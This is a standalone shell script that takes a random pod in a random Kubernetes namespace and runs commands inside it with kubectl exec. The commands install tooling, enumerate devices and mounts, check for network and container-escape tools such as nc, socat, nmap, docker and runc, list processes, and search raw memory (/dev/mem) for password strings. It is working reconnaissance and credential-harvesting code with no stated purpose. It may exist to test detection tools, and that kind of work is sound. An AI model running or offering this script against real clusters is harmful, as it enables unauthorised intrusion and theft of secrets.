 ns=$(kubectl get ns -ojson | jq -r --argjson r $RANDOM '.items[$r % length].metadata.name')
 podid=""
 while [ -z $podid  ] || [  $podid  = "null" ]; do
   echo "Waiting to get pod id"
   podid=$(kubectl get pods -n $ns -ojson | jq -r --argjson r $RANDOM '.items[$r % (length-1)].metadata.name')
   [ -z "$podid" ]  ||  [  $podid  = "null" ] && sleep 10
 done
echo "exec on the $podid in $ns"
 kubectl exec -ti $podid -n $ns -- /bin/bash -c "apt-get update && apt-get install procps && apt-get install binutils; ls /dev 2>/dev/null ; \
                cat /etc/fstab 2>/dev/null;\
                which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null ;\
                ps aux ; \
                ps -ef ; \
                top -n 1 ; \
                strings /dev/mem -n10 | grep -i PASS " || kubectl exec  -ti $podid -n $ns -- sh -c "apt-get update && apt-get install procps && apt-get install binutils; ls /dev 2>/dev/null ; \
                 cat /etc/fstab 2>/dev/null;\
                 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null ;\
                 ps aux ; \
                 ps -ef ; \
                 top -n 1 ; \
                 strings /dev/mem -n10 | grep -i PASS "
